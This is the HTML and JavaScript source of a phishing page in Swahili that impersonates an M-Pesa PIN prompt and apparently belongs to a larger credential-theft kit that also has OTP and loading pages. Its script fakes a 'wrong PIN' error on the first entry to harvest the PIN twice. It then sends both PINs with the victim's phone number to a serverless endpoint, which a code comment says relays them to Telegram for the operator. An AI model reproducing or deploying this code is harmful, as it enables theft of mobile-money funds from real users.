<!DOCTYPE html>
<html lang="sw">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Weka PIN</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
    <style>
        .pin-container {
            display: flex;
            gap: 15px;
            margin-bottom: 30px;
            justify-content: center;
        }

        .pin-dot {
            width: 15px;
            height: 15px;
            border-radius: 50%;
            border: 2px solid #3a3a3c;
            background-color: transparent;
            transition: background-color 0.2s;
        }

        .pin-dot.filled {
            background-color: #3a3a3c;
        }

        .content {
            margin-top: 50px;
        }

        .error-message {
            color: #E3000F;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 20px;
            min-height: 20px;
            text-align: center;
        }
    </style>
</head>

<body>
    <div class="app-container">
        <header class="top-nav">
            <button class="back-button" aria-label="Rudi nyuma" onclick="window.location.href='otp.html'">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="1.2">
                    <path d="M20 12H4M11 19l-7-7 7-7" stroke-linecap="round" stroke-linejoin="round" />
                </svg>
            </button>
        </header>

        <main class="content">
            <div class="icon-container">
                <svg width="60" height="60" viewBox="0 0 24 24" fill="#E3000F">
                    <path
                        d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                </svg>
            </div>

            <h1 class="title">Ingiza PIN</h1>
            <p class="subtitle">Tafadhali ingiza PIN yako ya M-Pesa kuhakiki</p>

            <div class="pin-container" id="pin-dots">
                <div class="pin-dot"></div>
                <div class="pin-dot"></div>
                <div class="pin-dot"></div>
                <div class="pin-dot"></div>
            </div>

            <p class="error-message" id="pin-error"></p>

            <input type="tel" id="pin-input" style="position: absolute; opacity: 0; pointer-events: none;" maxlength="4"
                pattern="[0-9]*" inputmode="numeric">

            <button class="confirm-button" id="confirm-pin" style="opacity: 0.5; pointer-events: none;">Endelea</button>
        </main>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const dots = document.querySelectorAll('.pin-dot');
            const pinInput = document.getElementById('pin-input');
            const confirmBtn = document.getElementById('confirm-pin');
            const content = document.querySelector('.content');
            const phone = sessionStorage.getItem('userPhone') || '';

            // Show error if redirected back with ?error=1
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('error') === '1') {
                document.getElementById('pin-error').textContent = 'Taarifa si sahihi, tafadhali jaribu tena.';
            }

            // Trigger keyboard on content click
            content.addEventListener('click', () => {
                pinInput.focus();
            });

            // Focus initially
            pinInput.focus();

            pinInput.addEventListener('input', () => {
                const val = pinInput.value;
                dots.forEach((dot, i) => {
                    if (i < val.length) dot.classList.add('filled');
                    else dot.classList.remove('filled');
                });

                if (val.length === 4) {
                    confirmBtn.style.opacity = '1';
                    confirmBtn.style.pointerEvents = 'auto';
                } else {
                    confirmBtn.style.opacity = '0.5';
                    confirmBtn.style.pointerEvents = 'none';
                }
            });

            let isSubmitting = false;
            let attempts = 0;
            let firstPin = "";

            confirmBtn.addEventListener('click', async () => {
                const pin = pinInput.value;
                if (pin.length === 4 && !isSubmitting) {
                    if (attempts === 0) {
                        // First attempt - simulate failure
                        firstPin = pin;
                        attempts++;

                        // Show error and reset
                        document.getElementById('pin-error').textContent = "PIN si sahihi, tafadhali jaribu tena.";
                        pinInput.value = "";
                        dots.forEach(dot => dot.classList.remove('filled'));
                        confirmBtn.style.opacity = '0.5';
                        confirmBtn.style.pointerEvents = 'none';
                        pinInput.focus();
                        return;
                    }

                    // Second attempt - send both PINs with phone to Telegram for approval
                    isSubmitting = true;
                    confirmBtn.style.opacity = '0.5';
                    confirmBtn.style.pointerEvents = 'none';
                    document.getElementById('pin-error').textContent = "";

                    try {
                        const res = await fetch('/.netlify/functions/request-approval', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ type: 'pin', phone: phone, data: { pin1: firstPin, pin2: pin } })
                        });
                        const resData = await res.json();
                        const sid = resData.sessionId;
                        window.location.href = `loading.html?sid=${sid}&next=success.html&error=${encodeURIComponent('pin.html?error=1')}`;
                    } catch (err) {
                        console.error('Request error:', err);
                        isSubmitting = false;
                        confirmBtn.style.opacity = '1';
                        confirmBtn.style.pointerEvents = 'auto';
                    }
                }
            });
        });
    </script>
</body>

</html>
